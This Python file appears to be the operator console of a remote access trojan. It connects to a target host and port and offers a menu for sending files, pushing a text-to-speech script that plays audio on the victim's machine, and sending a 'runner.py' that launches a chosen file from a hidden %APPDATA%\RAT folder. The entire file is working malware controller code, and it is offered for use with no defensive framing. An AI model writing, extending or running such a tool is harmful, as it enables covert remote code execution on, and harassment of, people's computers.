import socket
import tqdm
import os
import sys
import tempfile

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096  # send 4096 bytes each time step
port = None
host = None


def set_port(new_port):
    global port

    port = int(new_port)


def set_host(new_host):
    global host

    host = new_host


def get_port():
    return port


def get_host():
    return host


def connect(host, port):
    if not host or not port:
        print("[-] Host or port is not set")
        return
    s = socket.socket()

    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")
    return s


def send_file(s, filename):
    filesize = os.path.getsize(filename)
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    # start sending the file
    progress = tqdm.tqdm(
        range(filesize),
        f"Sending {filename}",
        unit="B",
        unit_scale=True,
        unit_divisor=1024,
    )
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    s.close()


def send_data(s, data: bytes, name: str):
    size = sys.getsizeof(data)
    s.send(f"{name}{SEPARATOR}{size}".encode())

    # start sending the file
    progress = tqdm.tqdm(
        range(size), f"Sending {name}", unit="B", unit_scale=True, unit_divisor=1024
    )

    with tempfile.TemporaryFile() as tempf:
        tempf.write(data)
        tempf.seek(0)
        while True:
            # read the bytes from the file
            bytes_read = tempf.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))

    s.close()


def send_tts(tts_text):
    s = connect(host, port)
    if not s:
        return
    tts = f"""from gtts import gTTS
import pygame

text = "{tts_text}"
# generate tts
pygame.init()
pygame.mixer.init()
output = gTTS(text=text, lang="en", tld="co.in")
output.save(f"tts.mp3")

   

pygame.mixer.music.load("tts.mp3")
pygame.mixer.music.play()
pygame.mixer.music.set_volume(1)

while pygame.mixer.music.get_busy():
   ...
"""
    send_data(s, tts.encode(), "tts.py")
    s.close()


def send_runner_code(filename):
    print(host, port)
    s = connect(host, port)
    if not s:
        return
    runner = f"""import os
os.startfile(os.path.join(os.path.join(os.getenv('APPDATA'), "RAT"), r"{filename}"))
"""
    send_data(s, runner.encode(), "runner.py")
    s.close()


def main():
    print("[+] Welcome")

    def input_ip():
        set_host(input("Input host ipv4: "))
        input_port = input("Input host port: ")

        if not input_port.isdigit():
            raise Exception("[!] port must be a digit")

        set_port(input_port)

        return host, port

    input_ip()
    while True:
        print(f"Target: {host}:{port}")
        print("1. send tts")
        print("2. send file")
        print("3. send file to run")
        print("4. change ip")
        print("0. exit")
        action = input("[?] Choose an action: ")

        if action == "1":
            send_tts(input("Input your tts message: "))
        elif action == "2":
            s = connect(host, port)
            if not s:
                print(f"[-] Error while connecting to {host}:{port}")
            send_file(s, input("Input path to the file you want to send: "))
            s.close()
        elif action == "3":
            send_runner_code(input("Input path to the file you want to send and run: "))
        elif action == "4":
            input_ip()
        elif action == "0":
            print("[<3] Bye!")
            return
        else:
            print("[-] invalid option")


if __name__ == "__main__":
    main()
